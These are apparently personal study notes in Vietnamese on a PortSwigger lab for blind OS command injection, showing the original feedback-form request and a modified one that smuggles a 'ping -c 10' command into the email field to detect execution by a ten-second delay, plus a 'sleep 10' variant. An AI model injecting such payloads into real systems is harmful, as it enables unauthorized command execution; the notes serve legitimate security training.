![[lab-os-command-blind-time.png]]
lab blind không trả output nên dùng ping delay 10s để confirm.

> [!NOTE] phân tích đề
> form feedback gửi email + message.
> server gọi `mail` gì đó mà không trả output.
> mình thử `echo` không thấy gì.
> nên mình chuyển sang đo time.

### hướng giải
- [ ] bắt request feedback submit
- [ ] thử separator `||`, `&`, `;` với `ping -c 10`
- [ ] đo time response, delay 10s là có RCE
- [ ] thử `sleep 10` nếu ping bị chặn

### giải
request gốc:

```http
POST /feedback/submit HTTP/1.1
Host: 0a6a44b707fbxxxx.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 45

email=test@test.com&message=hello
```

mình chèn:

```http
POST /feedback/submit HTTP/1.1
Host: 0a6a44b707fbxxxx.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 68

email=test@test.com||ping+-c+10+127.0.0.1||&message=hello
```

-> server chạy `ping -c 10 127.0.0.1` mất 10s.
=> response bình thường về ngay.
=> response này treo đúng ~10s mới về.
-> vậy là có RCE blind.
=> lab solved khi detect được delay.

-> nếu muốn chắc thì thử `;sleep 10;` cũng delay tương tự.

liên quan:
- [[lys thuyet OS command injection]]
- [[injection command]]
- [[Lab-OS command simple]]
- [[Lab-OS command blind output redirect]]

> [!NOTE] bài học
> sau khi quan sát lab này mình thấy...
> blind thì đừng cố đọc output.
> nên mình đo time trước cho nhanh.
> ping 10s là chuẩn PortSwigger hay dùng.
